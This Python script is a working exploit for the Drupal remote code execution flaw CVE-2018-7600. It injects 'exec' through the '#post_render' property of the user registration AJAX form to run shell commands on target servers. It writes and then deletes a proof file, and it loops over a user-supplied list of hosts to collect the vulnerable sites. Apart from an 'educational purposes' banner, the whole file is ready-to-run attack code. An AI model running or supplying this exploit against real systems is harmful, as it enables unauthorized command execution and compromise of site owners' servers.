#!/usr/bin/env python3
from random import sample
from string import ascii_lowercase
from readline import parse_and_bind
from requests import post, get, RequestException

info = '\033[1;33m[!]\033[1;m '
que = '\033[1;34m[?]\033[1;m '
bad = '\033[1;31m[-]\033[1;m '
good = '\033[1;32m[+]\033[1;m '

# Config:
cleanup = True  # Automated Cleanup

# Creates random file name
random_file_name = ''.join(sample(ascii_lowercase, 5)) + ".txt"
# Bash payload for creating user file
bash_command = "echo Name: $(id -un) UID: $(id -u) Groups: $(id -Gn) | tee %s" % random_file_name
# Bash payload for deleting
rm_command = "rm %s" % random_file_name


def cleanup_url(target):
    if not target.startswith('http'):
        target = "http://" + target

    if not target.endswith('/'):
        target = target + '/'

    return target


def generate_payload(command):
    payload = {
        'form_id': 'user_register_form',
        '_drupal_ajax': '1',
        'mail[#post_render][]': 'exec',
        'mail[#type]': 'markup',
        'mail[#markup]': command
    }
    return payload


def send_payload(target, payload):
    url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    return post(url, data=payload)


def send_command(target, command):
    return send_payload(target, generate_payload(command))


def check_if_file_created(target, file_name):
    url = target + file_name
    print(good + 'Checking... ' + url)
    file_response = get(url)
    if file_response.status_code != 404:
        print(good + 'File successfully created:')
        print(' ' * 4 + file_response.text.strip())
        if cleanup:
            print(good + "Deleting... " + url)
            try:
                send_command(target, rm_command)
            except RequestException:
                print(bad + "Failed to delete: " + url)
                print(bad + "Manual cleanup required")
        return True
    else:
        print(bad + target + ' File creation unsuccessful')
        return False


def cve_2018_7600(target):
    r = send_command(target, bash_command)
    if r.status_code == 200:
        print(good + target + ' Possibly exploitable')
        return check_if_file_created(target, random_file_name)
    else:
        print(bad + target + ' Not exploitable')
        return False


def exploit_from_file(file_name):
    vulnerable_sites = []
    with open(file_name) as file:
        for target in file:
            target = cleanup_url(target.strip())
            try:
                if cve_2018_7600(target):
                    vulnerable_sites.append(target)
            except Exception as e:
                print(bad + str(e))
    return vulnerable_sites


if __name__ == '__main__':
    try:
        print(info +
              'Provided only for educational or information purposes.'.upper())
        parse_and_bind('tab: complete')
        file_name = str(
            input(que + 'Enter file name (example: /root/file/hosts.txt): '))
        exploit_from_file = exploit_from_file(file_name)
    except KeyboardInterrupt:
        print(bad + 'Exiting...')
        exit(0)
